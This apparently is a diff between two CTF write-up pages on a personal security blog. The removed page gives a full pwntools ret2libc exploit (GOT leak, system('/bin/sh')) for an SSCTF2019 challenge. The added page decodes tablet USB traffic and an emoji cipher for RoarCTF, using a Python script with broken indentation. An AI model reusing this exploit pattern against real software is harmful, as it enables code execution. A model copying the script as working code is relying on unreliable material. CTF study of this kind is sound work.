@@ -15,9 +15,9 @@
     
 
     
-    <meta name="title" content="SSCTF2019 PWN题题解" />
-    <meta property="og:title" content="SSCTF2019 PWN题题解" />
-    <meta property="twitter:title" content="SSCTF2019 PWN题题解" />
+    <meta name="title" content="RoarCTF Misc Davinci-Cipher writeup" />
+    <meta property="og:title" content="RoarCTF Misc Davinci-Cipher writeup" />
+    <meta property="twitter:title" content="RoarCTF Misc Davinci-Cipher writeup" />
     
 
     
@@ -34,7 +34,7 @@
     <meta name="keyword"  content="V4ler1an, 有毒, yaoyao , V4ler1an的网络日志, V4ler1an的博客, V4ler1an Blog, 博客, 个人网站, Security, Binary, CTF, Windows, PWN, Re">
     <link rel="shortcut icon" href="/img/icon2.jpg">
 
-    <title>SSCTF2019 PWN题题解-V4ler1an的博客 | V4ler1an Blog</title>
+    <title>RoarCTF Misc Davinci-Cipher writeup-V4ler1an的博客 | V4ler1an Blog</title>
 
     <link rel="canonical" href="/CTF/Roarctf/">
 
@@ -173,7 +173,7 @@
 
 <style type="text/css">
     header.intro-header {
-        background-image: url('/img/bg2.png')
+        background-image: url('/img/bg1.png')
     }
 </style>
 <header class="intro-header">
@@ -183,8 +183,8 @@
                 <div class="post-heading">
                     <div class="tags">
                         
-                        <a class="tag" href="/tags/ssctf" title="SSCTF">
-                            SSCTF
+                        <a class="tag" href="/tags/roarctf" title="Roarctf">
+                            Roarctf
                         </a>
                         
                         <a class="tag" href="/tags/ctf" title="CTF">
@@ -192,15 +192,15 @@
                         </a>
                         
                     </div>
-                    <h1>SSCTF2019 PWN题题解</h1>
-                    <h2 class="subheading">SSCTF2019 PWN题题解</h2>
+                    <h1>RoarCTF Misc Davinci-Cipher writeup</h1>
+                    <h2 class="subheading">RoarCTF Misc Davinci-Cipher的writeup</h2>
                     <span class="meta">
                         Posted by 
                         
                             V4ler1an
                          
                         on 
-                        Sunday, October 27, 2019
+                        Saturday, October 26, 2019
                         
                         
                         
@@ -230,67 +230,113 @@
                 </header>
                 <nav id="TableOfContents">
   <ul>
-    <li><a href="#stackpwn">stackpwn</a>
-      <ul>
-        <li><a href="#exp">Exp：</a></li>
-      </ul>
-    </li>
+    <li><a href="#初步分析">初步分析</a></li>
+    <li><a href="#进一步分析">进一步分析</a></li>
+    <li><a href="#脚本">脚本</a></li>
   </ul>
 </nav>
                 
-                <h1 id="ssctf2019-pwn题题解">SSCTF2019 PWN题题解</h1>
-<h2 id="stackpwn">stackpwn</h2>
-<ol>
-<li>
-<p>首先file,checsec走一遍，64位程序，动态链接，开了NX</p>
-</li>
-<li>
-<p>IDA直接看，main函数：</p>
-<p><img src="/img/ssctf/picture/pwn//stackpwn/main.png" alt=""></p>
-</li>
-<li>
-<p>进入vuln看一下：</p>
-<p><img src="/img/ssctf/picture/pwn/stackpwn/vuln.png" alt=""></p>
-<p>容易看出，存在溢出点，且v1到返回地址的距离为(0x10 + 0x8 = 0x18)。</p>
-</li>
-</ol>
-<p>到此为止，我们大致明白了程序的流程：通过vuln函数进行栈溢出，但是程序没有给出system函数，所以需要我们进行两次利用，第一次利用进行地址泄漏，需要使用ROP，第二次真实进行攻击。<br>
-<strong>基本思路是首先泄漏出puts函数的实际地址（因为在main函数和溢出之前都使用过了，所以程序内存中存在puts函数的真实地址.使用pop rdi;ret将got表中的存放的puts函数的真实地址利用plt表中的puts函数打印出来，我泄漏我自己），然后泄漏libc的基地址，然后获取system函数的实际地址（libc基地址+system偏移地址）；程序中有/bin/sh字符串，所以直接用就可以了</strong>。</p>
-<h3 id="exp">Exp：</h3>
-<pre><code>from pwn import *
-
-context.log_level = 'debug'
-
-p = process('./stackpwn')
-
-offset = 0x18   #0x10+0x8
-pop_rdi_ret = 0x0000000000400933  #ROPgadet : rdi
-bin_sh = 0x0000000000400954   # address of /bin/sh
-
-elf = ELF(&quot;./stackpwn&quot;)
-libc = elf.libc     # leak libc
-
-payload = 'A'*offset + p64(pop_rdi_ret) + p64(elf.got['puts']) + p64(elf.plt['puts']) + p64(0x00000000004007E7) #last address is main address
-p.recvuntil(&quot;instructions...\n&quot;)
-
-p.sendline(payload)
-
-#get puts address
-puts_addr = u64(p.recv(6).ljust(8,'\x00'))
-
-#get libc address
-puts_base = libc.symbols['puts']
-libc_base = puts_addr - puts_base
-
-#get system address
-sys_addr = libc_base + libc.symbols['system']
-
-#second loop
-payload2 = 'A'*offset + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
-p.sendline(payload2)
-p.interactive()
-
+                <h1 id="roarctf-misc-davinci_cipher">RoarCTF MISC Davinci_Cipher</h1>
+<pre><code>这道题实在是可惜，第一天磕了半天没出来。第二天灵光乍现，但是晚了一分钟，比赛结束了。。。唉。。后来看官方的wp，思路步骤全是一样的。。。心痛。。
 </code></pre>
+<h2 id="初步分析">初步分析</h2>
+<p>题目给了两个附件，一个txt，一个流量包。打开txt看一下：</p>
+<pre><code>U+1F643U+1F4B5U+1F33FU+1F3A4U+1F6AAU+1F30FU+1F40EU+1F94BU+1F6ABU+1F606U+1F383U+1F993U+2709U+1F33FU+1F4C2U+2603U+1F449U+1F6E9U+2705U+1F385U+2328U+1F30FU+1F6E9U+1F6A8U+1F923U+1F4A7U+1F383U+1F34DU+1F601U+2139U+1F4C2U+1F6ABU+1F463U+1F600U+1F463U+1F643U+1F3A4U+2328U+1F601U+1F923U+1F3A4U+1F579U+1F451U+1F6AAU+1F374U+1F579U+1F607U+1F374U+1F40EU+2705U+2709U+1F30FU+23E9U+1F40DU+1F6A8U+2600U+1F607U+1F3F9U+1F441U+1F463U+2709U+1F30AU+1F6A8U+2716
+</code></pre><p>很明显是unicode码，这里首先就想到了可能会用到代码点去进行转换（也就是这个第一印象给自己带偏了）。<br>
+txt文件没有其他信息了，直接开流量包吧：</p>
+<p><img src="/img/ctf/roarctf/misc/%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%9D%E6%AD%A5%E5%88%86%E6%9E%90.png" alt=""></p>
+<p>首先注意到流量中有一个图片，直接导出特定包，然后把图片提取出来：</p>
+<p><img src="/img/ctf/roarctf/misc/%E7%83%9F%E9%9B%BE%E5%BC%B9.png" alt=""></p>
+<p>然后开始各种蹂躏这个图，然并卵，没有任何有价值的信息。思路不对，而且没有发现图片和txt的丝毫关联。</p>
+<h2 id="进一步分析">进一步分析</h2>
+<p>回到流量包，继续磕，发现了另外一个猫腻：存在USB协议流量</p>
+<ul>
+<li>分析USB流量<br>
+发现了一个Wacom PTH-660的设备。果断google，是一个数位板。之前遇到过一个类似的ctf题目，大概猜测是通过数位板进行绘画，然后在流量中体现。</li>
+<li>分析数位板流量<br>
+USB流量的数据段是Leftover Capture Data，发现的数位板的src为1.9.1，frame长度为54。直接筛选可能的有效流量：(usb.src == &ldquo;1.9.1&rdquo;)&amp;&amp;(frame.len == 54)并导出筛选出后的分组usb.pcapng。</li>
+<li>分析数据段<br>
+USB协议可以从<a href="https://www.usb.org/sites/default/files/documents/hut1_12v2.pdf">USB协议</a>了解详细的过程，而且其中包含了对数位板的介绍。这里主要看一下与这道题目相关的数位板：</li>
+</ul>
+<p><img src="/img/ctf/roarctf/misc/%E6%95%B0%E4%BD%8D%E6%9D%BF.png" alt=""></p>
+<p>需要对该数位板的数据格式做一个分析：x，y坐标以小端存储。结合之前在流量包中看到的数据，我们可以猜测到坐标存储的位置。红框为坐标高位bit，同一时间内变 化小于绿框(低位bit)变化率，橙框变化猜测为压力值，笔离开画板时压力变为0。</p>
+<p><img src="/img/ctf/roarctf/misc/%E6%95%B0%E4%BD%8D%E6%9D%BF%E6%95%B0%E6%8D%AE.png" alt=""></p>
+<h2 id="脚本">脚本</h2>
+<pre><code># coding:utf-8
+import sys
+import os
+import numpy as np
+import matplotlib.pyplot as plt
+mousePositionX = 0
+mousePositionY = 0
+X = [] Y = []
+DataFileName = &quot;test.txt&quot;
+data = []
+def main():
+    global mousePositionX
+    global mousePositionY
+    # check argv
+    if len(sys.argv) == 1:
+         print &quot;Usage : &quot;
+        print &quot;        python UsbDigitizerHacker.py data.pcap [Conditions used
+to sort]&quot;
+        print &quot;Tips : &quot;
+        print &quot;        To use this python2 script , you must install the
+numpy,matplotlib first.&quot;
+        print &quot;        You can use `sudo pip install matplotlib numpy` to
+install it&quot;
+exit(1)
+    # get argv
+    pcapFilePath = sys.argv[1]
+    print pcapFilePath
+    # get data of pcap
+    if len(sys.argv)==2:
+        command = &quot;tshark -r '%s' -T fields -e usb.capdata &gt; %s&quot; % (
+            pcapFilePath, DataFileName)
+        print command
+        os.system(command)
+    if len(sys.argv)==3:
+        Conditions=sys.argv[2]
+        command = &quot;tshark -r '%s' -T fields -e usb.capdata -Y '%s' &gt; %s&quot; % (
+            pcapFilePath,Conditions, DataFileName)
+        print command
+        os.system(command)
+    with open(DataFileName, &quot;rb&quot;) as f:
+        flag=1
+for line in f:
+if line[24:26] != &quot;00&quot;: 
+                print line
+                data.append(line[0:-1])
+for line in data:
+        x0=int(line[6:8],16)
+        x1=int(line[9:11],16)
+        x=x0+x1*256
+        y0=int(line[15:17],16)
+        y1=int(line[18:20],16)
+        y=y0+y1*256
+        X.append(x)
+        Y.append(-y)
+    #draw
+    fig = plt.figure()
+    ax1 = fig.add_subplot(111)
+    ax1.set_title('[%s]' % (pcapFilePath))
+    ax1.scatter(X, Y, c='r', marker='o')
+    plt.savefig(&quot;out.png&quot;)
+    plt.show()
+    #clean temp data
+    os.system(&quot;rm ./%s&quot; % (DataFileName))
+if __name__ == &quot;__main__&quot;:
+    main()
+
+</code></pre><p>这里可以得到图如下所示：</p>
+<p><img src="/img/ctf/roarctf/misc/key.png" alt=""></p>
+<p>哦！flag！我直接提交，然而。。。错误。<br>
+到此为止，我花了半天的时间去搞完这些操作，最后也得到一个高度仿真的flag。然而提示我错误？思路中断，，</p>
+<p>第二天，早上醒来，突然想到flag.txt还没有用过！打开，直接复制去UTF-8解码（其实有点气急败坏了），发现不对。至此，比赛结束。然后，我发现这是emoji！！！！！去解码，key用上面那个图中的字符串：</p>
+<p><img src="/img/ctf/roarctf/misc/%E8%BD%AC%E7%A0%81.png" alt=""></p>
+<p><img src="/img/ctf/roarctf/misc/flag.png" alt=""></p>
+<p>然而，时间已经过去了，，，比赛结束了。</p>
+
 
                 
                 
@@ -337,13 +383,13 @@ p.interactive()
                 <ul class="pager">
                     
                     <li class="previous">
-                        <a href="/CTF/Roarctf/" data-toggle="tooltip" data-placement="top" title="RoarCTF Misc Davinci-Cipher writeup">&larr;
+                        <a href="/2019/10/CVE-2019-0547/" data-toggle="tooltip" data-placement="top" title="CVE-2019-0547 Analyse">&larr;
                             Previous Post</a>
                     </li>
                     
                     
                     <li class="next">
-                        <a href="/CTF/pwn" data-toggle="tooltip" data-placement="top" title="CTF Pwn环境搭建">Next
+                        <a href="/CTF/Roarctf/" data-toggle="tooltip" data-placement="top" title="SSCTF2019 PWN题题解">Next
                             Post &rarr;</a>
                     </li>
                     
@@ -481,128 +527,6 @@ p.interactive()
 <footer>
     <div class="container">
         <div class="row">
-            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-                <ul class="list-inline text-center">
-                   
-                   <li>
-                       <a href='' rel="alternate" type="application/rss+xml" title="V4ler1an Blog" >
-                           <span class="fa-stack fa-lg">
-                               <i class="fa fa-circle fa-stack-2x"></i>
-                               <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
-                           </span>
-                       </a>
-                   </li>
-                   
-                    
-                    <li>
-                        <a href="mailto:whiteghostwalker@gmail.com">
-                            <span class="fa-stack fa-lg">
-                                <i class="fa fa-circle fa-stack-2x"></i>
-                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
-                            </span>
-                        </a>
-                    </li>
-		    
-                    
-                    
-                    <li>
-                        <a href="https://twitter.com/YaoyaoShaw">
-                            <span class="fa-stack fa-lg">
-                                <i class="fa fa-circle fa-stack-2x"></i>
-                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
-                            </span>
-                        </a>
-                    </li>
-                    
-                    
-                    
-
-                    
-
-		    
-                    
-                    
-                    <li>
-                        <a target="_blank" href="https://github.com/AlexsanderShaw">
-                            <span class="fa-stack fa-lg">
-                                <i class="fa fa-circle fa-stack-2x"></i>
-                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
-                            </span>
-                        </a>
-                    </li>
-		    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                    
-                </ul>
-		<p class="copyright text-muted">
-                    Copyright &copy; V4ler1an Blog 2020
-                    <br>
-                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
-                    <iframe
-                        style="margin-left: 2px; margin-bottom:-5px;"
-                        frameborder="0" scrolling="0" width="100px" height="20px"
-                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
-                    </iframe>
-                </p>
-            </div>
-        </div>
-    </div>
-</footer>
-
-
-
-
-<script>
-    function async(u, c) {
-      var d = document, t = 'script',
-          o = d.createElement(t),
-          s = d.getElementsByTagName(t)[0];
-      o.src = u;
-      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
-      s.parentNode.insertBefore(o, s);
-    }
-</script>
-
-
-
-
-
-
-<script>
-    
-    if($('#tag_cloud').length !== 0){
-        async("/js/jquery.tagcloud.js",function(){
-            $.fn.tagcloud.defaults = {
-                
-                color: {start: '#bbbbee', end: '#0085a1'},
-            };
-            $('#tag_cloud a').tagcloud();
-        })
-    }
-</script>
-
-
-<script>
-    async("https://cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.js", function(){
-        var $nav = document.querySelector("nav");
-        if($nav) FastClick.attach($nav);
-    })
-</script>
-
-
-
-
-
-
-</body>
-</html>
-row">
             <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                 <ul class="list-inline text-center">
                    
